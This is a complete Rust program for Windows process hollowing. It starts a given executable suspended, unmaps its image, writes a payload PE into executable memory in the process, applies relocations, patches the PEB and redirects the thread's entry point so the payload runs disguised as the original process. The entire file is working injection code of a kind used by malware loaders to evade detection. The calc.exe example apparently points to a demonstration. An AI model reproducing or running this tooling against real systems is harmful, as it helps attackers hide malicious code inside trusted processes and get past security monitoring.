use std::{
    ffi::CString,
    fs::{self, File},
    io::Read,
    mem::zeroed,
    ops::Add,
    ptr::null_mut,
    str::from_utf8,
};

use windows_sys::{
    Wdk::System::{
        Memory::{NtUnmapViewOfSection, ZwUnmapViewOfSection},
        Threading::{NtQueryInformationProcess, ProcessWin32kSyscallFilterInformation},
    },
    Win32::System::{
        Diagnostics::Debug::{
            CONTEXT, CONTEXT_CONTROL_AMD64, CONTEXT_FULL_AMD64, CONTEXT_INTEGER_AMD64,
            GetThreadContext, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_FILE_HEADER,
            IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, ReadProcessMemory, SetThreadContext,
            WriteProcessMemory,
        },
        Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx},
        SystemServices::{
            IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE,
            IMAGE_REL_BASED_DIR64,
        },
        Threading::{
            CREATE_SUSPENDED, CreateProcessA, PEB, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION,
            ResumeThread, STARTUPINFOA, WaitForSingleObject,
        },
    },
};

fn pause() {
    println!("Press Enter to continue...");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();
}

fn main() {
    let args = std::env::args().collect::<Vec<String>>();

    if args.len() < 3 {
        println!("Usage: {} <target_process> <payload_path>", args[0]);
        println!(
            "  [+] {} C:\\Windows\\System32\\notepad.exe C:\\Windows\\System32\\calc.exe",
            args[0]
        );
        return;
    }

    let mut fd = match File::open(args.get(2).unwrap()) {
        Ok(file) => file,
        Err(e) => {
            println!("[-] Failed to open payload file: {}", e);
            return;
        }
    };

    let mut buffer = Vec::new();
    if let Err(e) = File::open(&args[2]).and_then(|mut f| f.read_to_end(&mut buffer)) {
        println!("[-] Failed to read payload file: {}", e);
        return;
    }

    println!("[+] Payload file size: {} bytes", buffer.len());

    let file = File::open(args.get(1).unwrap()).unwrap();
    let meta = file.metadata().unwrap();
    let target_process_size = meta.len();

    if target_process_size < buffer.len() as u64 {
        println!("[-] Target process file is smaller than payload file");
        return;
    }

    // let proc_name = "C:\\Windows\\System32\\notepad.exe\0";
    let proc_name = CString::new(args[1].as_str()).unwrap();

    unsafe {
        let mut si = zeroed::<STARTUPINFOA>();
        si.cb = size_of::<STARTUPINFOA>() as u32;
        let mut pi = zeroed::<PROCESS_INFORMATION>();

        if CreateProcessA(
            proc_name.as_ptr() as *const u8,
            null_mut(),
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        ) == 0
        {
            println!("[-] Failed to create process");
            return;
        }

        println!("[+] Created suspended process with PID: {}", pi.dwProcessId);

        // pause();

        let mut pbi = zeroed::<PROCESS_BASIC_INFORMATION>();
        let mut return_length = 0;
        let status = NtQueryInformationProcess(
            pi.hProcess,
            0,
            &mut pbi as *mut _ as *mut _,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_length,
        );

        if status != 0 {
            println!("[-] Failed to query process information");
            return;
        }

        let mut old_base: u64 = 0;
        let mut bytes_read = 0;
        if ReadProcessMemory(
            pi.hProcess,
            (pbi.PebBaseAddress as usize + 0x10) as *const _,
            &mut old_base as *mut _ as *mut _,
            size_of::<u64>(),
            &mut bytes_read,
        ) == 0
        {
            println!("[-] Failed to read process memory");
            return;
        }

        println!("[+] Old Image Base address: {:016x}", old_base);
        // pause();

        let status = NtUnmapViewOfSection(pi.hProcess, old_base as *const _);
        if status != 0 {
            println!("[-] Failed to unmap view of section: {:0X}", status);
            return;
        }

        let dos_header = buffer.as_ptr() as *const IMAGE_DOS_HEADER;

        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            println!("[-] Invalid DOS signature in payload");
            return;
        }

        let nt_headers =
            (buffer.as_ptr()).add((*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;

        if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
            println!("[-] Invalid NT signature in payload");
            return;
        }

        let size_of_image = (*nt_headers).OptionalHeader.SizeOfImage;

        let address_of_entry_point = (*nt_headers).OptionalHeader.AddressOfEntryPoint;
        let preferred_base = (*nt_headers).OptionalHeader.ImageBase;

        let remote_buffer = VirtualAllocEx(
            pi.hProcess,
            null_mut(),
            size_of_image as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if remote_buffer.is_null() {
            println!("[-] Failed to allocate memory in target process");
            return;
        }

        println!(
            "[+] Allocated memory in target process at: {:016x}",
            remote_buffer as u64
        );

        let mut bytes_written = 0;
        let headers_size = (*nt_headers).OptionalHeader.SizeOfHeaders;
        if WriteProcessMemory(
            pi.hProcess,
            remote_buffer,
            buffer.as_ptr() as *const _,
            headers_size as usize,
            &mut bytes_written,
        ) == 0
        {
            println!("[-] Failed to write headers to target process");
            return;
        }

        let opt_header_size = (*nt_headers).FileHeader.SizeOfOptionalHeader as usize;
        let number_of_sections = (*nt_headers).FileHeader.NumberOfSections;
        let first_section = (nt_headers as *const u8)
            .add(4 + size_of::<IMAGE_FILE_HEADER>() + opt_header_size)
            as *const IMAGE_SECTION_HEADER;

        for i in 0..number_of_sections {
            let section = first_section.add(i as usize);

            let name = String::from_utf8_lossy(&section.read().Name)
                .trim_matches('\0')
                .to_string();

            println!("[+] Writing section {} to target process", name);

            let virtual_addr = (*section).VirtualAddress;
            let size_of_raw_data = (*section).SizeOfRawData;
            let pointer_to_raw_data = (*section).PointerToRawData;

            if size_of_raw_data == 0 {
                continue;
            }

            if WriteProcessMemory(
                pi.hProcess,
                (remote_buffer as usize + virtual_addr as usize) as *mut _,
                buffer.as_ptr().add(pointer_to_raw_data as usize) as *const _,
                size_of_raw_data as usize,
                &mut bytes_written,
            ) == 0
            {
                println!("[-] Failed to write section {} to target process", name);
                return;
            }
        }

        let delta = (remote_buffer as u64) - preferred_base;
        if delta != 0 {
            println!("[+] Relocating image by delta: {:016x}", delta);

            let reloc_dir = (*nt_headers).OptionalHeader.DataDirectory
                [IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];

            if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
                println!("[-] No relocation information found in payload");
                return;
            }

            let mut reloc_section = None;

            for i in 0..number_of_sections {
                let section = first_section.add(i as usize);
                let virtual_addr = (*section).VirtualAddress;
                let virtual_size = if section.read().Misc.VirtualSize != 0 {
                    section.read().Misc.VirtualSize
                } else {
                    section.read().SizeOfRawData
                };

                if reloc_dir.VirtualAddress >= virtual_addr
                    && reloc_dir.VirtualAddress < virtual_addr + virtual_size
                {
                    reloc_section = Some(section);
                    break;
                }
            }

            if reloc_section.is_none() {
                println!("[-] Relocation section not found in payload");
                return;
            }

            let reloc_sec = reloc_section.unwrap();

            let mut offset = 0u32;
            while offset < reloc_dir.Size {
                let block = (buffer.as_ptr() as usize
                    + reloc_sec.read().PointerToRawData as usize
                    + offset as usize) as *const IMAGE_BASE_RELOCATION;
                let block_size = block.read().SizeOfBlock;
                let block_page = block.read().VirtualAddress;

                if block_size == 0 {
                    break;
                }

                let entry_count = (block_size - size_of::<IMAGE_BASE_RELOCATION>() as u32) / 2;

                let entries = (block as *const u16).add(1);

                for j in 0..entry_count as usize {
                    let entry = entries.add(j);
                    let type_ = (*entry) >> 12;
                    let offset_in_block = (*entry) & 0x0FFF;
                    if type_ == 0 {
                        continue;
                    }

                    if type_ != IMAGE_REL_BASED_DIR64 as u16 {
                        println!(
                            "[-] Unsupported relocation type: {} at block page {:08x}",
                            type_, block_page
                        );
                        return;
                    }

                    let patch_addr =
                        (remote_buffer as usize + block_page as usize + offset_in_block as usize)
                            as *mut u64;

                    let mut old_val: u64 = 0;
                    if ReadProcessMemory(
                        pi.hProcess,
                        patch_addr as *const _,
                        &mut old_val as *mut _ as *mut _,
                        size_of::<u64>(),
                        &mut bytes_written,
                    ) == 0
                    {
                        println!("[-] Failed to read memory for relocation");
                        return;
                    }

                    let new_val = old_val + delta;
                    if WriteProcessMemory(
                        pi.hProcess,
                        patch_addr as *mut _,
                        &new_val as *const _ as *const _,
                        size_of::<u64>(),
                        &mut bytes_written,
                    ) == 0
                    {
                        println!("[-] Failed to write memory for relocation");
                        return;
                    }
                }
                offset += block_size;
            }
            println!("[+] Relocation completed successfully");
        } else {
            println!("[+] No relocation needed, preferred base matches allocated base");
        }

        let new_base = remote_buffer as u64;

        if WriteProcessMemory(
            pi.hProcess,
            (pbi.PebBaseAddress as usize + 0x10) as *mut _,
            &new_base as *const _ as *const _,
            size_of::<u64>(),
            &mut bytes_written,
        ) == 0
        {
            println!("[-] Failed to write new image base to PEB");
            return;
        }
        println!("[+] Updated PEB with new image base: {:016x}", new_base);

        let mut ctx = zeroed::<CONTEXT>();
        ctx.ContextFlags = CONTEXT_FULL_AMD64;

        if GetThreadContext(pi.hThread, &mut ctx) == 0 {
            println!("[-] Failed to get thread context");
            return;
        }

        // ctx.Rcx = remote_buffer as u64;
        ctx.Rip = (remote_buffer as usize + address_of_entry_point as usize) as u64;

        println!(
            "[+] Setting thread context to entry point: {:016x}",
            ctx.Rip
        );

        pause();

        if SetThreadContext(pi.hThread, &ctx) == 0 {
            println!("[-] Failed to set thread context");
            return;
        }

        if ResumeThread(pi.hThread) == 0 {
            println!("[-] Failed to resume thread");
            return;
        }
    }
}
